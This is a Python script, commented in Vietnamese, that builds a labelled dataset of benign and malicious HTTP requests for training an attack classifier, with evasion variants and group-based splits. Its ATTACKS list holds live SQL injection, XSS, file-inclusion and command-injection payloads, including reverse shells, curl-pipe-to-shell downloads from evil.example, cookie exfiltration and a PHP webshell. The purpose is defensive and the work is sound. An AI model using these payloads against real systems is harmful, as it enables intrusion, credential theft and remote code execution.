"""Sinh bộ dữ liệu HTTP request có nhãn (benign / sqli / xss / lfi / rce).

Mỗi payload tấn công gốc có một `group` riêng; mọi biến thể (URL-encode, đổi hoa
thường, chèn comment...) của cùng payload dùng chung group. Khi chia train/test
theo group, tập test chỉ chứa payload mà mô hình CHƯA từng thấy -> đánh giá khả
năng tổng quát hoá thay vì học thuộc.

Chạy:  python -m ai.dataset --out data/requests.csv
"""
from __future__ import annotations

import argparse
import csv
import random
import string
from pathlib import Path
from urllib.parse import quote, quote_plus

# --------------------------------------------------------------------------
# Request bình thường
# --------------------------------------------------------------------------
WORDS = [
    "laptop", "phone", "shoes", "coffee", "python", "cloud", "armor", "book",
    "hanoi", "saigon", "ao thun", "tai nghe", "giay", "ban phim", "camera",
    "summer sale", "gift card", "news", "weather", "music", "movie", "travel",
    # Hard negatives: chứa từ khoá giống tấn công nhưng là hợp lệ
    "select a plan", "drop shipping", "union station", "o'brien", "script writing",
    "update profile", "delete account help", "1=1 math", "rock & roll", "c++ tutorial",
    "<3 love", "alert system", "order by price", "insert coin", "exec summary",
    "cat food", "ping pong", "etc tips", "windows 11", "bin day schedule",
]
NAMES = ["an", "binh", "chi", "dung", "hoa", "khanh", "linh", "minh", "nam", "trang"]

BENIGN_TEMPLATES = [
    ("GET", "/", None),
    ("GET", "/index.html", None),
    ("GET", "/products?id={num}", None),
    ("GET", "/products?category={word}&page={small}", None),
    ("GET", "/search?q={word}", None),
    ("GET", "/search?q={word}&sort=price&order=asc", None),
    ("GET", "/api/users/{num}", None),
    ("GET", "/api/orders?user_id={num}&status=paid", None),
    ("GET", "/blog/{slug}", None),
    ("GET", "/static/js/app.{hex}.js", None),
    ("GET", "/static/css/main.{hex}.css", None),
    ("GET", "/images/{slug}.png", None),
    ("GET", "/download?file={slug}.pdf", None),
    ("GET", "/redirect?next=/account/{slug}", None),
    ("GET", "/healthz", None),
    ("POST", "/login", "username={name}&password={pw}"),
    ("POST", "/register", "email={name}{small}%40example.com&name={word}"),
    ("POST", "/comment", "post_id={num}&text={word}"),
    ("POST", "/api/cart", '{{"product_id": {num}, "qty": {small}}}'),
    ("POST", "/api/feedback", '{{"message": "{word}", "rating": {small}}}'),
    ("PUT", "/api/users/{num}", '{{"display_name": "{name}"}}'),
    ("DELETE", "/api/cart/{num}", None),
]

# --------------------------------------------------------------------------
# Payload tấn công gốc (chuỗi kiểm thử phổ biến, dùng cho mục đích phòng thủ)
# --------------------------------------------------------------------------
ATTACKS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", "admin'--", "' OR 'a'='a' #",
        "1' UNION SELECT NULL,NULL--", "1 UNION ALL SELECT username,password FROM users",
        "' UNION SELECT @@version--", "1; DROP TABLE users--", "'; EXEC xp_cmdshell('dir')--",
        "1 AND SLEEP(5)", "1' AND (SELECT SLEEP(5))--", "1; WAITFOR DELAY '0:0:5'--",
        "1 AND 1=CONVERT(int,(SELECT @@version))", "' AND extractvalue(1,concat(0x7e,version()))--",
        "1' ORDER BY 3--", "1 GROUP BY 1 HAVING 1=1", "' OR EXISTS(SELECT * FROM users)--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--", "' OR pg_sleep(5)--",
        "1 OR BENCHMARK(1000000,MD5(1))", "') OR ('1'='1", "1' AND updatexml(1,concat(0x7e,user()),1)--",
        "' UNION SELECT table_name FROM information_schema.tables--", "1;SELECT LOAD_FILE('/etc/passwd')",
        "' OR 1=1 LIMIT 1 OFFSET 0--", "1' INTO OUTFILE '/var/www/shell.php'--", "%' AND 1=0 UNION SELECT 1,2--",
        "' HAVING 1=1--", "1 AND (SELECT COUNT(*) FROM sysobjects)>0",
    ],
    "xss": [
        "<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert('xss')>",
        "\"><script>alert(1)</script>", "'><img src=x onerror=prompt(1)>", "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>", "<a href=\"javascript:alert(1)\">x</a>",
        "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>", "<marquee onstart=alert(1)>", "<math><mtext><script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</script>", "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        "<svg/onload=fetch('//evil.example/'+document.cookie)>", "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>", "<div style=\"background:url(javascript:alert(1))\">",
        "<script src=//evil.example/x.js></script>", "\" onmouseover=\"alert(1)", "<isindex action=javascript:alert(1)>",
        "<form action=javascript:alert(1)><input type=submit>", "<base href=javascript:alert(1)//>",
        "<link rel=import href=//evil.example>", "<textarea onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>", "<keygen autofocus onfocus=alert(1)>",
    ],
    "lfi": [
        "../../../../etc/passwd", "../../../../etc/shadow", "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini", "/etc/passwd%00", "../../../../proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd",
        "../../../../var/log/apache2/access.log", "/../../../../../../boot.ini",
        "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252fetc%252fpasswd", "/proc/self/cmdline",
        "zip://shell.jpg#payload.php", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        "../../../../../../etc/hosts", "c:\\windows\\system32\\drivers\\etc\\hosts",
        "../WEB-INF/web.xml", "../../../../root/.ssh/id_rsa", "/var/www/html/../../../etc/group",
        "....\\\\....\\\\windows\\\\system.ini", "../../../../usr/local/apache/conf/httpd.conf",
        "php://input", "/etc/passwd", "../../.env", "../../../.git/config",
        "phar://uploads/avatar.jpg", "/proc/version", "..;/..;/etc/passwd",
    ],
    "rce": [
        "; cat /etc/passwd", "| id", "&& whoami", "`id`", "$(whoami)", "; ls -la /",
        "| nc -e /bin/sh 10.0.0.1 4444", "; wget http://evil.example/x.sh -O- | sh",
        "; curl http://evil.example/x | bash", "& ping -c 4 127.0.0.1", "|| uname -a",
        "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", "$(curl evil.example)", "; rm -rf /tmp/x",
        "| powershell -c Get-Process", "& cmd.exe /c dir", "; python -c 'import os;os.system(\"id\")'",
        "${jndi:ldap://evil.example/a}", "${jndi:rmi://evil.example:1099/x}", "{{7*7}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "<?php system($_GET['c']); ?>",
        "; echo vulnerable > /tmp/pwn", "() { :; }; /bin/bash -c 'id'", "| perl -e 'print 1'",
        "; nslookup evil.example", "&& net user", "; chmod +x /tmp/x && /tmp/x",
        "#{7*7}", "; sleep 10",
    ],
}

INJECTION_TEMPLATES = [
    ("GET", "/products?id={p}"),
    ("GET", "/search?q={p}"),
    ("GET", "/search?q={word}&sort={p}"),
    ("GET", "/api/users/{p}"),
    ("GET", "/download?file={p}"),
    ("GET", "/blog?page={p}"),
    ("GET", "/redirect?next={p}"),
    ("POST", "/login", "username={p}&password={pw}"),
    ("POST", "/comment", "post_id={num}&text={p}"),
    ("POST", "/api/feedback", '{{"message": "{pjson}", "rating": 5}}'),
]


# --------------------------------------------------------------------------
# Biến thể / làm rối payload
# --------------------------------------------------------------------------
def _mixcase(s: str, rng: random.Random) -> str:
    return "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in s)


def _sql_comments(s: str, rng: random.Random) -> str:
    return s.replace(" ", "/**/")


def variants(payload: str, category: str, rng: random.Random) -> list[str]:
    out = [payload, quote(payload, safe=""), _mixcase(payload, rng), quote_plus(payload)]
    if rng.random() < 0.5:
        out.append(quote(quote(payload, safe=""), safe=""))  # double-encode
    if category == "sqli":
        out.append(_sql_comments(payload, rng))
    if category == "xss":
        out.append(payload.replace("<", "%3C").replace(">", "%3E"))
    if category == "rce":
        out.append(payload.replace(" ", "${IFS}"))
    return list(dict.fromkeys(out))


def _fill(template: str, rng: random.Random, **extra: str) -> str:
    vals = {
        "num": str(rng.randint(1, 99999)),
        "small": str(rng.randint(1, 20)),
        "word": quote_plus(rng.choice(WORDS)),
        "slug": "-".join(rng.choice(WORDS).split()).replace("'", ""),
        "hex": "".join(rng.choices("0123456789abcdef", k=8)),
        "name": rng.choice(NAMES),
        "pw": "".join(rng.choices(string.ascii_letters + string.digits, k=10)),
    }
    vals.update(extra)
    return template.format(**vals)


def _render(method: str, path: str, body: str | None) -> str:
    return f"{method} {path}" + (f"\n\n{body}" if body else "")


def generate(n_benign: int = 6000, seed: int = 42) -> list[dict]:
    rng = random.Random(seed)
    rows: list[dict] = []

    for i in range(n_benign):
        method, path_t, body_t = rng.choice(BENIGN_TEMPLATES)
        path = _fill(path_t, rng)
        body = _fill(body_t, rng) if body_t else None
        rows.append({"request": _render(method, path, body), "label": 0,
                     "category": "benign", "group": f"benign-{i}"})

    for category, payloads in ATTACKS.items():
        for pid, payload in enumerate(payloads):
            for v in variants(payload, category, rng):
                for _ in range(3):  # mỗi biến thể chèn vào 3 vị trí ngẫu nhiên
                    t = rng.choice(INJECTION_TEMPLATES)
                    pjson = v.replace("\\", "\\\\").replace('"', '\\"')
                    path = _fill(t[1], rng, p=v, pjson=pjson)
                    body = _fill(t[2], rng, p=v, pjson=pjson) if len(t) > 2 else None
                    rows.append({"request": _render(t[0], path, body), "label": 1,
                                 "category": category, "group": f"{category}-{pid}"})

    rng.shuffle(rows)
    return rows


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default="data/requests.csv")
    ap.add_argument("--n-benign", type=int, default=6000)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    rows = generate(args.n_benign, args.seed)
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["request", "label", "category", "group"])
        w.writeheader()
        w.writerows(rows)

    counts: dict[str, int] = {}
    for r in rows:
        counts[r["category"]] = counts.get(r["category"], 0) + 1
    print(f"Đã ghi {len(rows)} dòng vào {out}: {counts}")


if __name__ == "__main__":
    main()
